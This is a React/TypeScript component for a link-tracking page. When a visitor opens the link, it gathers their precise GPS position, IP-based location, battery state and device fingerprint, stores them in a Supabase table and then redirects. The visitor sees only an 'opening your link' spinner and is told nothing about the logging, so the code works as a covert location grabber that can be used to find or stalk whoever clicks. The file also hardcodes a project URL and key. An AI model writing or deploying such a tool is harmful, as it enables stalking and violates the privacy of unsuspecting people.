import { useEffect, useState } from 'react';
import { supabase, isSupabaseConfigured } from '../lib/supabase';

interface TrackingPageProps {
  trackingCode: string;
}

interface TrackingLink {
  id: string;
  tracking_code: string;
  target_url: string;
  creator_id?: string;
  status: string;
  created_at: string;
}

interface DeviceInfo {
  browser: string;
  browserVersion: string;
  os: string;
  deviceType: string;
  screenResolution: string;
  language: string;
  timezone: string;
  userAgent: string;
  platform: string;
}

export const TrackingPage: React.FC<TrackingPageProps> = ({ trackingCode }) => {
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);

  // Collect device information (instant - no async calls)
  const getDeviceInfo = (): DeviceInfo => {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    let browserVersion = 'Unknown';
    let os = 'Unknown';
    let deviceType = 'Desktop';

    // Browser detection
    if (ua.includes('Firefox')) {
      browser = 'Firefox';
      browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Chrome')) {
      browser = 'Chrome';
      browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Safari')) {
      browser = 'Safari';
      browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
    } else if (ua.includes('Edge')) {
      browser = 'Edge';
      browserVersion = ua.match(/Edge\/(\d+\.\d+)/)?.[1] || 'Unknown';
    }

    // OS detection
    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'macOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS')) os = 'iOS';

    // Device type detection
    if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
      deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile';
    }

    return {
      browser,
      browserVersion,
      os,
      deviceType,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      userAgent: ua,
      platform: navigator.platform,
    };
  };

  // Get battery information (async but fast)
  const getBatteryInfo = async (): Promise<{ level: number | null; charging: boolean | null }> => {
    if ('getBattery' in navigator) {
      try {
        const battery = await (navigator as any).getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
        };
      } catch (e) {
        console.warn('Battery API error:', e);
      }
    }
    return { level: null, charging: null };
  };

  // Get high-accuracy GPS geolocation
  const getGeolocation = (): Promise<{ latitude: number | null; longitude: number | null; accuracy: number | null; altitude: number | null }> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve({ latitude: null, longitude: null, accuracy: null, altitude: null });
        return;
      }

      // Force enableHighAccuracy: true & maximumAge: 0 for fresh pinpoint hardware GPS coordinates
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || null,
          });
        },
        (error) => {
          console.warn('High accuracy Geolocation error:', error);
          resolve({ latitude: null, longitude: null, accuracy: null, altitude: null });
        },
        { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
      );
    });
  };

  // Get IP address racing multiple fast APIs in parallel
  const getIPInfo = async (): Promise<{ ip: string | null; city: string | null; region: string | null; country: string | null; lat: number | null; lon: number | null }> => {
    const fetchApi = (url: string, parse: (d: any) => any) => {
      return new Promise((resolve, reject) => {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 2000);
        fetch(url, { signal: controller.signal })
          .then(r => {
            if (!r.ok) throw new Error('API error');
            return r.json();
          })
          .then(d => {
            clearTimeout(timer);
            const parsed = parse(d);
            if (parsed && parsed.ip && parsed.lat != null && parsed.lon != null) {
              resolve(parsed);
            } else {
              reject(new Error('Invalid IP payload'));
            }
          })
          .catch(err => {
            clearTimeout(timer);
            reject(err);
          });
      });
    };

    const apis = [
      fetchApi('https://ipwho.is/', d => ({
        ip: d.ip,
        city: d.city,
        region: d.region,
        country: d.country,
        lat: d.latitude,
        lon: d.longitude
      })),
      fetchApi('http://ip-api.com/json/', d => ({
        ip: d.query,
        city: d.city,
        region: d.regionName,
        country: d.country,
        lat: d.lat,
        lon: d.lon
      })),
      fetchApi('https://freeipapi.com/api/json', d => ({
        ip: d.ipAddress,
        city: d.cityName,
        region: d.regionName,
        country: d.countryName,
        lat: d.latitude,
        lon: d.longitude
      }))
    ];

    try {
      return await (Promise.any(apis) as Promise<{ ip: string | null; city: string | null; region: string | null; country: string | null; lat: number | null; lon: number | null }>);
    } catch (e) {
      console.warn('All IP APIs failed:', e);
      return { ip: null, city: null, region: null, country: null, lat: null, lon: null };
    }
  };

  // Send tracking data reliably using fetch
  const sendTrackingData = async (logData: any) => {
    if (!isSupabaseConfigured) return false;

    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://zdnpadhlblyazzzwserr.supabase.co';
    const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'sb_publishable_zo1mrKN61gpDnlZNBnxzKg_BFLQed-E';

    const url = `${supabaseUrl}/rest/v1/tracking_logs?apikey=${supabaseAnonKey}`;

    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': supabaseAnonKey,
          'Authorization': `Bearer ${supabaseAnonKey}`,
          'Prefer': 'return=minimal'
        },
        body: JSON.stringify(logData),
        keepalive: true
      });
      return res.ok;
    } catch (err) {
      console.error('Failed to send tracking data via fetch:', err);
      if (navigator.sendBeacon) {
        const blob = new Blob([JSON.stringify(logData)], { type: 'application/json' });
        return navigator.sendBeacon(url, blob);
      }
      return false;
    }
  };

  useEffect(() => {
    const processTracking = async () => {
      try {
        setLoading(true);

        // Step 1: Fetch tracking link from database (must be fast)
        let trackingLink: TrackingLink | null = null;
        
        if (isSupabaseConfigured) {
          const { data, error } = await supabase
            .from('tracking_links')
            .select('*')
            .eq('tracking_code', trackingCode)
            .single();

          if (error || !data) {
            setError('Invalid or expired tracking link');
            setLoading(false);
            return;
          }

          trackingLink = data as TrackingLink;
        } else {
          setError('Tracking requires database configuration');
          setLoading(false);
          return;
        }

        // Step 2: Collect instant device information
        const deviceInfo = getDeviceInfo();

        // Helper for hard JS timeout
        const withTimeout = <T,>(promise: Promise<T>, ms: number, fallback: T): Promise<T> => {
          return Promise.race([
            promise,
            new Promise<T>((resolve) => setTimeout(() => resolve(fallback), ms))
          ]);
        };

        // Step 3: Collect async data with hard timeouts (6s window for hardware GPS lock)
        const [batteryInfo, geoInfo, ipInfo] = await Promise.all([
          withTimeout(getBatteryInfo(), 1500, { level: null, charging: null }),
          withTimeout(getGeolocation(), 6000, { latitude: null, longitude: null, accuracy: null, altitude: null }),
          withTimeout(getIPInfo(), 1500, { ip: null, city: null, region: null, country: null, lat: null, lon: null })
        ]);

        const hasGps = geoInfo && geoInfo.latitude !== null && geoInfo.longitude !== null;
        const latitude = hasGps ? geoInfo.latitude : (ipInfo ? ipInfo.lat : null);
        const longitude = hasGps ? geoInfo.longitude : (ipInfo ? ipInfo.lon : null);
        const accuracy = hasGps ? geoInfo.accuracy : (ipInfo && ipInfo.lat !== null ? 5000 : null);

        // Step 4: Prepare log data
        const completeLogData = {
          tracking_link_id: trackingLink.id,
          latitude,
          longitude,
          accuracy,
          battery_level: batteryInfo.level,
          charging: batteryInfo.charging,
          browser: deviceInfo.browser,
          browser_version: deviceInfo.browserVersion,
          os: deviceInfo.os,
          device_type: deviceInfo.deviceType,
          screen_resolution: deviceInfo.screenResolution,
          language: deviceInfo.language,
          timezone: deviceInfo.timezone,
          user_agent: deviceInfo.userAgent,
          platform: deviceInfo.platform,
          ip_address: ipInfo.ip,
          city: ipInfo.city,
          region: ipInfo.region,
          country: ipInfo.country,
          visited_at: new Date().toISOString(),
        };

        // Step 5: Fix and prepare target URL
        let targetUrl = trackingLink.target_url || 'https://google.com';
        if (targetUrl.match(/^https?:[^/]/i)) {
          targetUrl = targetUrl.replace(/^https?:/i, 'https://');
        }
        if (targetUrl.match(/^https?:\/\/https?:\/\//i)) {
          targetUrl = targetUrl.replace(/^https?:\/\/https?:\/\//i, 'https://');
        }
        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
          targetUrl = 'https://' + targetUrl;
        }

        // Step 6: Send data to Supabase and wait for confirmation
        await sendTrackingData(completeLogData);

        // Step 7: Redirect to destination
        setLoading(false);
        window.location.replace(targetUrl);

      } catch (e) {
        console.error('Tracking error:', e);
        setError('An error occurred during tracking');
        setLoading(false);
      }
    };

    processTracking();
  }, [trackingCode]);

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="text-center space-y-4">
          <div className="text-red-500 text-4xl mb-4">⚠️</div>
          <h1 className="text-xl font-bold text-gray-800">Invalid or Expired Tracking Link</h1>
          <p className="text-sm text-gray-600">The tracking link you followed is not valid or has expired.</p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <div className="text-center space-y-4">
          <div className="w-12 h-12 border-4 border-gray-300 border-t-blue-500 rounded-full animate-spin mx-auto" />
          <p className="text-sm text-gray-600">We are opening your link...</p>
        </div>
      </div>
    );
  }

  return null;
};
